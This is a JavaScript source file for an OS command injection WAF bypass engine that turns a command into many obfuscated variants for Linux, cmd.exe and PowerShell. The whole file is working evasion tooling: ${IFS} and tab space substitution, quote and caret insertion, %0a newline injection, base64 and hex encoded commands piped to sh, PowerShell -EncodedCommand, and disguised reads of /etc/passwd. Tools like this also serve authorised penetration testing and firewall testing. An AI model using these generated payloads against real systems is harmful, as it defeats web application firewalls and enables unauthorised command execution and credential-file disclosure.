/**
 * OS Command Injection WAF Bypass Engine
 * Generates multiple evasion variants for command injection payloads.
 * Supports: Linux, Windows
 */

import { utf8ToBase64, utf16LeToBase64, utf8ToHex, utf8ToHexEscapes } from '../utils/encoding.js'
import { parseCommand, mapCommandSpaces } from '../utils/helpers.js'
import { finalizeVariants } from '../utils/variants.js'

function escapeTransportLiterals(value) {
  return value.replace(/%/g, '%25').replace(/\+/g, '%2B')
}

/* ── Linux Space Bypass ───────────────────────────── */
function applySpaceBypassLinux(payload) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  if (args) {
    // ${IFS} replacement
    variants.push(`${prefix}${command}\${IFS}${mapCommandSpaces(args, '${IFS}')}`)
    // {cmd,arg} brace expansion
    if (!/["'\\]/.test(args)) {
      const allParts = [command, ...args.split(/\s+/)].filter(Boolean)
      variants.push(`${prefix}{${allParts.join(',')}}`)
    }
    // Tab (%09)
    variants.push(`${escapeTransportLiterals(prefix)}${escapeTransportLiterals(command)}%09${mapCommandSpaces(escapeTransportLiterals(args), '%09', '%20')}`)
  } else {
    variants.push(payload)
  }

  return variants
}

/* ── Windows Space Bypass ─────────────────────────── */
function applySpaceBypassWindows(payload) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  if (args) {
    // Transport encodings: valid after the web stack URL-decodes the value.
    const safePrefix = escapeTransportLiterals(prefix)
    const safeCommand = escapeTransportLiterals(command)
    const safeArgs = escapeTransportLiterals(args)
    variants.push(`${safePrefix}${safeCommand}%09${mapCommandSpaces(safeArgs, '%09', '%20')}`)
    variants.push(`${safePrefix}${safeCommand}%20${mapCommandSpaces(safeArgs, '%20', '%20')}`)
  } else {
    variants.push(payload)
  }

  return variants
}

/* ── Keyword Bypass (Linux) ───────────────────────── */
function applyKeywordBypassLinux(payload) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  // Single-quote insertion: c'a't
  const quoted = command.split('').map((c, i) => {
    if (i > 0 && i < command.length - 1 && i % 2 === 1) return `'${c}'`
    return c
  }).join('')
  variants.push(`${prefix}${quoted} ${args}`.trim())

  // Double-quote insertion: c"a"t
  const dquoted = command.split('').map((c, i) => {
    if (i > 0 && i < command.length - 1 && i % 2 === 0) return `"${c}"`
    return c
  }).join('')
  variants.push(`${prefix}${dquoted} ${args}`.trim())

  // Backslash insertion: c\a\t
  const bslash = command.split('').map((c, i) => {
    if (i > 0 && i < command.length - 1 && i % 2 === 1) return `\\${c}`
    return c
  }).join('')
  variants.push(`${prefix}${bslash} ${args}`.trim())

  // Also obfuscate file paths in args
  if (args.includes('/etc/passwd')) {
    const obfArgs = [
      args.replace('/etc/passwd', "/e'tc/pa'ss'wd"),
      args.replace('/etc/passwd', '/e"t"c/pas"s"wd'),
      args.replace('/etc/passwd', '/e\\tc/pas\\swd'),
    ]
    obfArgs.forEach(a => {
      variants.push(`${prefix}${command} ${a}`.trim())
    })
  }

  return variants
}

/* ── Keyword Bypass (Windows) ─────────────────────── */
function applyKeywordBypassWindows(payload) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  // ^ insertion: w^h^o^a^m^i
  const caret = command.split('').map((c, i) => {
    if (i > 0 && i % 2 === 1) return `^${c}`
    return c
  }).join('')
  variants.push(`${prefix}${caret} ${args}`.trim())

  // %COMSPEC% /c
  variants.push(`${prefix}%COMSPEC% /c ${command} ${args}`.trim())

  // Delayed expansion avoids first-pass %variable% expansion. Do not emit it
  // when nested quotes or delayed-expansion metacharacters would change args.
  if (!/["!%]/.test(args)) {
    const varName = 'x42'
    variants.push(`${prefix}cmd /D /V:ON /C "set ${varName}=${command}&& !${varName}!${args ? ` ${args}` : ''}"`.trim())
  }

  return variants
}

function applyKeywordBypassPowerShell(payload) {
  const { prefix, command, args } = parseCommand(payload)
  if (!command) return []
  const splitAt = Math.max(1, Math.floor(command.length / 2))
  const first = command.slice(0, splitAt).replace(/'/g, "''")
  const second = command.slice(splitAt).replace(/'/g, "''")
  const codeUnits = Array.from({ length: command.length }, (_, index) => command.charCodeAt(index)).join(',')
  const suffix = args ? ` ${args}` : ''

  return [
    `${prefix}&('${first}'+'${second}')${suffix}`,
    `${prefix}&([string]::Concat([char[]]@(${codeUnits})))${suffix}`,
  ]
}

function isSimplePowerShellInvocation(payload) {
  const value = payload.trim()
  if (/\r|\n/.test(value)) return false
  const { command } = parseCommand(value)
  if (!command || command.startsWith('$') || command.startsWith('@')) return false
  return !/^(?:begin|break|class|continue|data|do|dynamicparam|else|elseif|end|exit|filter|finally|for|foreach|function|if|in|param|process|return|switch|throw|trap|try|until|while|workflow)\b/i.test(command)
}

/* ── Newline Injection ────────────────────────────── */
function applyNewlineBypass(payload, target) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)
  const cmd = `${command}${args ? ' ' + args : ''}`
  const safeCmd = escapeTransportLiterals(cmd)

  // %0a (URL encoded newline)
  variants.push(`%0a${safeCmd}`)
  // %0d%0a (CRLF)
  variants.push(`%0d%0a${safeCmd}`)
  return variants
}

/* ── Variable Expansion Tricks ────────────────────── */
function applyVariableExpansion(payload, target) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  if (target === 'linux') {
    const commandLine = `${command}${args ? ' ' + args : ''}`
    const b64 = utf8ToBase64(commandLine)
    variants.push(`${prefix}printf %s ${b64}|base64 -d|sh`)
    variants.push(`${prefix}sh -c "$(printf %s ${b64}|base64 -d)"`)
  } else {
    // PowerShell encoded command
    const commandLine = `${command}${args ? ` ${args}` : ''}`
    variants.push(`${prefix}powershell -NoProfile -EncodedCommand ${utf16LeToBase64(commandLine, false)}`)
  }

  return variants
}

/* ── Hex Encoded Commands ─────────────────────────── */
function applyHexCmd(payload, target) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  if (target === 'linux') {
    // printf hex
    const hex = utf8ToHexEscapes(command)
    variants.push(`${prefix}$(printf '${hex}')${args ? ' ' + args : ''}`)

    // xxd approach
    const hexStr = utf8ToHex(command)
    variants.push(`${prefix}$(echo ${hexStr}|xxd -r -p)${args ? ' ' + args : ''}`)

    // Also hex-encode arguments if present
    if (args) {
      const fullHex = utf8ToHexEscapes(`${command} ${args}`)
      variants.push(`${prefix}printf '${fullHex}'|sh`)
    }
  } else {
    const commandLine = `${command}${args ? ` ${args}` : ''}`
    const codeUnits = Array.from({ length: commandLine.length }, (_, index) => commandLine.charCodeAt(index)).join(',')
    // This branch targets PowerShell directly. Avoid a nested powershell.exe
    // command line because cmd.exe and PowerShell quote native arguments
    // differently.
    variants.push(`${prefix}&([scriptblock]::Create([string]::Concat([char[]]@(${codeUnits}))))`)
    variants.push(`${prefix}powershell -NoProfile -EncodedCommand ${utf16LeToBase64(commandLine, false)}`)
  }

  return variants
}

/* ── Main Engine ─────────────────────────────────── */
export function generateCmdiVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = []
  allVariants.push({ payload, label: 'Original', layers: [] })

  if (layers.includes('space-bypass')) {
    const fn = target === 'linux' ? applySpaceBypassLinux : applySpaceBypassWindows
    fn(payload).forEach(v => {
      allVariants.push({
        payload: v,
        label: 'Space Bypass',
        layers: ['space-bypass'],
        validity: 'conditional',
        note: v.includes('%09') || v.includes('%20')
          ? 'Requires one percent-decoding pass before the command shell parses the value.'
          : 'Requires the selected shell and its standard word-splitting or brace-expansion behavior.',
      })
    })
  }

  if (layers.includes('keyword-bypass') && (target !== 'powershell' || isSimplePowerShellInvocation(payload))) {
    const fn = target === 'windows'
      ? applyKeywordBypassWindows
      : target === 'powershell'
        ? applyKeywordBypassPowerShell
        : applyKeywordBypassLinux
    fn(payload).forEach(v => {
      const runtime = target === 'windows' ? 'cmd.exe' : target === 'powershell' ? 'PowerShell' : 'a POSIX-compatible shell'
      allVariants.push({ payload: v, label: 'Keyword Bypass', layers: ['keyword-bypass'], validity: 'conditional', note: `Requires ${runtime} parsing.` })
    })
  }

  if (layers.includes('newline-bypass')) {
    applyNewlineBypass(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Newline Injection', layers: ['newline-bypass'], validity: 'conditional', note: 'Requires one percent-decoding pass before command parsing.' })
    })
  }

  if (layers.includes('variable-expansion') && target !== 'windows') {
    applyVariableExpansion(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Encoded Command', layers: ['variable-expansion'], validity: 'conditional', note: target === 'powershell' ? 'Requires PowerShell.' : 'Requires sh and a base64 decoder.' })
    })
  }

  if (layers.includes('hex-cmd') && target !== 'windows') {
    applyHexCmd(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Hex Commands', layers: ['hex-cmd'], validity: 'conditional', note: target === 'powershell' ? 'Requires PowerShell.' : 'Requires a shell with printf command substitution; the xxd variant additionally requires xxd.' })
    })
  }

  // Combos
  if (layers.length >= 2) {
    if (layers.includes('space-bypass') && layers.includes('keyword-bypass') && target === 'linux') {
      const { prefix, command, args } = parseCommand(payload)
      if (args) {
        const obfCmd = command.replace(/(.)(.)/, "$1''$2")
        const combo = `${prefix}${obfCmd}\${IFS}${mapCommandSpaces(args, '${IFS}')}`
        allVariants.push({ payload: combo, label: 'Space + Keyword', layers: ['space-bypass', 'keyword-bypass'], validity: 'conditional', note: 'Requires a POSIX-compatible shell and standard IFS word splitting.' })
      }
    }
  }

  return finalizeVariants(allVariants, layers)
}
